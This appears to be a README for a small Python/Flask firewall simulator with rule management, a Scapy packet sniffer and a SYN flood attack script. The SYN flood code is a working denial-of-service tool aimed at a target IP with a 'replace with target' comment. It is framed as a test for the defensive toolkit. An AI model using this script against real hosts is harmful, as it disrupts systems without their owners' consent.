# 🛡️ CyberDefend Firewall Simulator

A simple firewall simulation and network defense toolkit built with Python and Flask. It includes rule-based packet filtering, real-time packet sniffing, and a basic SYN flood attack simulator for testing.

![Python](https://img.shields.io/badge/python-3.8%2B-blue)
![Flask](https://img.shields.io/badge/flask-2.3.x-lightgrey)
![License](https://img.shields.io/badge/license-MIT-green)

---

## 🔥 Features

- 📋 Web-based Firewall Rule Management
- 🧪 Real-time Packet Sniffer using Scapy
- ⚔️ SYN Flood Attack Simulation Tool
- 🗂️ JSON-based Rule Storage
- 🌐 Flask-powered Web Interface
- 📄 Security Logs for Packet Monitoring

---

## 📁 Project Structure

```
CyberDefend/
├── app.py                # Flask backend (Firewall rule manager)
├── sniffer.py            # Packet analysis tool
├── simulate_attack.py    # Attack simulation (SYN flood)
├── requirements.txt      # Python dependencies
├── firewall_rules.json   # Rule database
├── traffic_logs.txt      # Packet logs
├── static/
│   └── styles.css        # Front-end styles
└── templates/
    ├── index.html        # Home UI
    └── logs.html         # Traffic log view
```

---

## 🧠 Core Code Highlights

### 1. **Firewall Rule Management (`app.py`)**
```python
from flask import Flask, render_template, request, redirect
import json

app = Flask(__name__)

def load_rules():
    try:
        with open('firewall_rules.json') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

@app.route('/add_rule', methods=['POST'])
def add_rule():
    rules = load_rules()
    rules.append({
        'ip': request.form['ip'],
        'action': request.form.get('action', 'BLOCK')
    })
    with open('firewall_rules.json', 'w') as f:
        json.dump(rules, f)
    return redirect('/')
```

### 2. **Packet Sniffer (`sniffer.py`)**
```python
from scapy.all import sniff, IP
from datetime import datetime

def packet_handler(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        print(f"[{datetime.now()}] Packet from {src_ip}")

print("🛡️ Starting packet sniffer...")
sniff(prn=packet_handler, filter="ip", store=0)
```

### 3. **Attack Simulator (`simulate_attack.py`)**
```python
from scapy.all import send, IP, TCP
import time

def syn_flood(target_ip, duration=10):
    end_time = time.time() + duration
    while time.time() < end_time:
        send(IP(dst=target_ip)/TCP(dport=80, flags="S"), verbose=0)
        time.sleep(0.01)

if __name__ == "__main__":
    syn_flood("192.168.1.1")  # Replace with target IP
```

---

## 🛡️ Security Tip

Always validate user input like IP addresses before saving rules:
```python
import re

def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None

# Example usage:
if not is_valid_ip(request.form['ip']):
    return "Invalid IP address", 400
```

---

## 🧪 Testing Your Setup

```bash
# Run Flask app
python app.py &

# Run packet sniffer (new terminal)
sudo python sniffer.py

# Run SYN flood simulation (new terminal)
sudo python simulate_attack.py
```

---

## 🚀 Deployment

### Heroku `Procfile`
```
web: python app.py
worker: python sniffer.py
```

### Dockerfile
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
RUN pip install -r requirements.txt
EXPOSE 5000
CMD ["python", "app.py"]
```

---

## 📜 License

MIT License  
© 2024 Your Name

Permission is hereby granted, free of charge, to any person obtaining a copy  
of this software and associated documentation files (the "Software"), to deal  
in the Software without restriction, including without limitation the rights  
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell  
copies of the Software, and to permit persons to whom the Software is  
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in  
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR  
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,  
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE  
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER  
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,  
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN  
THE SOFTWARE.
